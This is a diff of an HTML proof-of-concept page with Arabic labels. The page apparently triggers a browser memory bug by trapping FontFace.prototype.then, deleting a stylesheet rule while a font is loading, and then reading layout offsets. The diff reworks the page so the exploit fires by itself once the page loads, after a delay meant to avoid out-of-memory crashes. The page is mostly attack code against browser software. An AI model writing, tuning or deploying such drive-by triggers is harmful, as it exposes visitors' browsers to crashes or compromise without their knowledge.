@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>تحليل التوقيت التلقائي - التفعيل الفوري</title>
+    <title>تحليل التوقيت التلقائي المستقر - تفادي OOM</title>
     <style>
         body { background-color: #121212; color: #e0e0e0; font-family: monospace; padding: 20px; }
         #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 400px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
@@ -17,10 +17,10 @@
 </head>
 <body>
 
-    <h2>مراقبة التفعيل التلقائي (Automated Userland Trigger)</h2>
-    <p>يتم الفحص الآن تلقائياً بمجرد تحميل المتصفح للمستند...</p>
+    <h2>مراقبة التفعيل التلقائي المستقر (Post-Load Execution)</h2>
+    <p>يتم الآن الانتظار لاستقرار بيئة المستند قبل تفعيل كمين المقاطعة...</p>
     
-    <div id="custom-console">[نظام المحاكاة نشط]: في انتظار تحميل الصفحة...</div>
+    <div id="custom-console">[نظام المحاكاة نشط]: في انتظار استقرار المتصفح...</div>
 
     <script>
         const consoleElement = document.getElementById('custom-console');
@@ -32,10 +32,10 @@
             consoleElement.scrollTop = consoleElement.scrollHeight;
         }
 
-        // تفعيل الثغرة تلقائياً بمجرد دخول الموقع
-        window.onload = () => {
-            consoleElement.innerHTML = ""; // تصفير واجهة العرض لبدء التتبع الفوري
-            screenLog("تم رصد دخول الموقع - بدء تشغيل الثغرة تلقائياً...");
+        // دالة الفحص الأساسية
+        function startExploitAnalysis() {
+            consoleElement.innerHTML = ""; 
+            screenLog("بدء تشغيل الثغرة بعد استقرار بيئة الـ Userland...");
 
             try {
                 let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
@@ -44,44 +44,49 @@
 
                 let fired = false;
 
-                // إعداد كمين التداخل مع الحماية من الـ OOM
+                // إعداد كمين التداخل مع الإغلاق الصارم للـ Promise لمنع تكرار المكدس
                 Object.defineProperty(FontFace.prototype, 'then', {
                     configurable: true,
                     get() {
                         if (!fired && this === A) {
                             fired = true;
-                            screenLog("!! تم تفعيل الكمين المنطقي أثناء تحميل الصفحة !!", true);
+                            screenLog("!! تم تفعيل الكمين المنطقي بنجاح !!", true);
                             
-                            // محاولة إغراق وتغيير حالة الذاكرة بكائنات خطوط أخرى
                             new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                             new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                             
                             try {
                                 document.getElementById('s').sheet.deleteRule(0);
-                                screenLog("تم حذف القاعدة التنسيقية تلقائياً.");
+                                screenLog("تم إرسال أمر حذف القاعدة التنسيقية.");
                             } catch(e) { 
-                                screenLog("خطأ أثناء الحذف التلقائي: " + e.message, true); 
+                                screenLog("خطأ أثناء الحذف: " + e.message, true); 
                             }
                             
-                            // تأجيل القراءة عبر خيط التنفيذ التالي (Macro-task Window)
+                            // قراءة الـ Offset بعد تأخير بسيط لمعاينة استجابة الذاكرة
                             setTimeout(() => {
-                                screenLog("محاولة القراءة المؤجلة (offsetTop) بعد انتهاء دورة التحميل الأصلية...");
+                                screenLog("محاولة القراءة المؤجلة (offsetTop)...");
                                 let offset = document.body.offsetTop;
-                                screenLog("قيمة الـ Offset المسترجعة تلقائياً: " + offset);
-                            }, 10); // زيادة مهلة التأخير طفيفاً لمنع الـ Pinning
+                                screenLog("قيمة الـ Offset المسترجعة: " + offset);
+                            }, 10);
                         }
                         
+                        // إنهاء الـ Promise قانونياً لمنع حلقة الـ OOM اللانهائية
                         return function(resolve) { if (resolve) resolve(); };
                     }
                 });
 
-                // إطلاق الدالة الرسمية لتنشيط الـ Pipeline
-                screenLog("إرسال طلب التحميل المباشر document.fonts.load...");
+                screenLog("إطلاق طلب التحميل المباشر document.fonts.load...");
                 document.fonts.load('1em x', 'AB');
 
             } catch (err) {
                 screenLog("خطأ عام في النظام: " + err.message, true);
             }
+        }
+
+        // الانتظار حتى تحميل الصفحة بالكامل، ثم إعطاء مهلة ثانية ونصف للاستقرار التام
+        window.onload = () => {
+            screenLog("تم تحميل الصفحة. جاري الانتظار 1.5 ثانية لتفادي الـ OOM التلقائي...");
+            setTimeout(startExploitAnalysis, 1500);
         };
 
         window.onerror = function(msg) {
